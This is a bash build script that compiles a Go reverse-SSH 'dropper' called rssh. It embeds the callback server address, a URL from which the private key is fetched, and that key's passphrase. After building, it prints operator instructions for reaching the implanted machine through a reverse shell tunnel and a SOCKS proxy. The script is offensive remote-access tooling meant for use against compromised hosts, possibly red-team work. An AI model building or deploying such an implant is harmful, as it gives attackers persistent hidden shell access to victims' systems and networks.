#!/bin/bash


serverPort=22
serverHost=192.168.88.15
serverUser=tester
serverUserKeyUrl="http://127.0.0.1:9000/id_rsa_test_enc"
serverUserKeyPassphrase=password1
remoteCmdHost=127.0.0.1
remoteCmdPort=2022
remoteCmdUser=operator
remoteCmdPwd=$( date | shasum | cut -d" " -f1)
remoteSocksHost=127.0.0.1
remoteSocksPort=1080

dropperName="rssh"

echo "[*] Building dropper"
go build -ldflags \
    "-X main.serverPort=${serverPort}  \
     -X main.serverHost=${serverHost} \
     -X main.serverUser=${serverUser} \
     -X main.serverUserKeyUrl=${serverUserKeyUrl} \
     -X main.serverUserKeyPassphrase=${serverUserKeyPassphrase} \
     -X main.remoteCmdHost=${remoteCmdHost}  \
     -X main.remoteCmdPort=${remoteCmdPort} \
     -X main.remoteCmdUser=${remoteCmdUser} \
     -X main.remoteCmdPwd=${remoteCmdPwd} \
     -X main.remoteSocksHost=${remoteSocksHost} \
     -X main.remoteSocksPort=${remoteSocksPort}" \
     -o ${dropperName} ./rssh.go \
     ./types.go ./vars.go ./Pty.go ./socksport.go ./keymgmt.go ./traffic.go

if [[ $? -eq 0 ]]
then
    echo "[*] Dropper Information (keep it safe):"
    printf "    %s\n" "#######################"
    printf "    %s\n" "Dropper File: ${dropperName} ($(stat -f '%z bytes' ${dropperName}))"
    printf "    %s\n" "SSH serverHost=${serverHost}"
    printf "    %s\n" "SSH serverPort=${serverPort}"
    printf "    %s\n" "SSH serverUser=${serverUser}"
    printf "    %s\n" "SSH serverUserKeyUrl=${serverUserKeyUrl}"
    printf "    %s\n" "SSH serverUserKeyPassphrase=${serverUserKeyPassphrase}"
    printf "    %s\n" "SSH-RT remoteCmdHost=${remoteCmdHost}"
    printf "    %s\n" "SSH-RT remoteCmdPort=${remoteCmdPort}"
    printf "    %s\n" "SSH-RT remoteCmdUser=${remoteCmdUser}"
    printf "    %s\n" "SSH-RT remoteCmdPwd=${remoteCmdPwd}"
    printf "    %s\n" "SSH-RTS remoteSocksHost=${remoteSocksHost}"
    printf "    %s\n" "SSH-RTS remoteSocksPort=${remoteSocksPort}"
    printf "    %s\n" "SSH-RT shell agent password: ${remoteCmdPwd} "
    printf "    %s\n" "#######################"
    printf "\n    %s\n" "   Usage SSH-RT: ssh ${remoteCmdUser}@${remoteCmdHost} -p ${remoteCmdPort} "
    printf "    %s\n" "   Usage SSH-RTS: browser SOCKS proxy: ${remoteSocksHost}:${remoteSocksPort} "
fi

